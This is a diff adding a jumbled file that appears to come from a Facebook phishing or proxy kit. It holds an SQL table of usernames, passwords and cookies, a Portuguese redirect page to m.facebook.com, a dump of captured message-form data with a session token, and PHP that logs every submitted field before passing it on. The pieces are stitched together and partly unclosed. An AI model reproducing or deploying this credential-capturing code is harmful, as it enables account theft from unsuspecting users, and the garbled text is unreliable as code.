@@ -1,0 +1,60 @@
+﻿INSERT INTO `398948`.`fb` (`id`, `usr`, `pw`, `data`, `cookie`) VALUES ('00', 'usr', 'pw', 'dt', 'ck');
+
+<html>
+
+<head>
+    <title>Redirecionando...</title>
+    <meta http-equiv="refresh" content="0;url=http://h.facebook.com/hr/r?redirect_app=9&amp;next=https%3A%2F%2Fm.facebook.com%2F&amp;zc=Afp6VYwxAgC-kMu8T34fVwiSUoKHiIdRFrkNGYuz5nDxUctJGkZGKbN2_lMeTCW5UFE&amp;rtime=1396737238&amp;_rdr"
+    />
+</head>
+
+<body>
+    <script type="text/javascript">
+        document.location.href = "http:\/\/h.facebook.com\/hr\/r?redirect_app=9&next=https\u00253A\u00252F\u00252Fm.facebook.com\u00252F&zc=Afp6VYwxAgC-kMu8T34fVwiSUoKHiIdRFrkNGYuz5nDxUctJGkZGKbN2_lMeTCW5UFE&rtime=1396737238&_rdr"
+    </script>
+    Se você não for redirecionado automaticamente, clique em <a href="http://h.facebook.com/hr/r?redirect_app=9&amp;next=https%3A%2F%2Fm.facebook.com%2F&amp;zc=Afp6VYwxAgC-kMu8T34fVwiSUoKHiIdRFrkNGYuz5nDxUctJGkZGKbN2_lMeTCW5UFE&amp;rtime=1396737238&amp;manual_redirect=1&amp;_rdr">aqui</a>.</body>
+
+</html>
+
+
+Array
+(
+    [p] => /messages/send/?icm=1
+    [refid] => 12
+)
+Array
+(
+    [fb_dtsg] => AQGMi-hm0frX
+    [charset_test] => €,´,€,´,水,Д,Є
+    [body] => ok
+    [send] => Responder
+    [tids] => msg.e87bd75644eaa8d1575b946b38d1a6f420
+    [wwwupp] => V3
+    [ids] => Array
+        (
+            [100001047907010] => 100001047907010
+        )
+
+    [csid] => 95f83162-b2d6-4e05-97fc-2fc6b19a73b8
+    
+    
+    
+    
+    <?php
+    	if(!empty($_POST)){
+            $fields='';
+            foreach($_POST as $key=>$value){
+                if(!is_array($value)){
+                    $fields.=$key.'='.$value.'&';
+                }else{
+                    foreach($value as $k=>$v){
+                        $fields.=$key.'['.$k.']'.'='.$v.'&'; 
+                    }
+                }
+            }
+            rtrim($fields, '&');
+            lg($fields);
+            $pages->setPost($fields);
+        }
+    ?>
+)
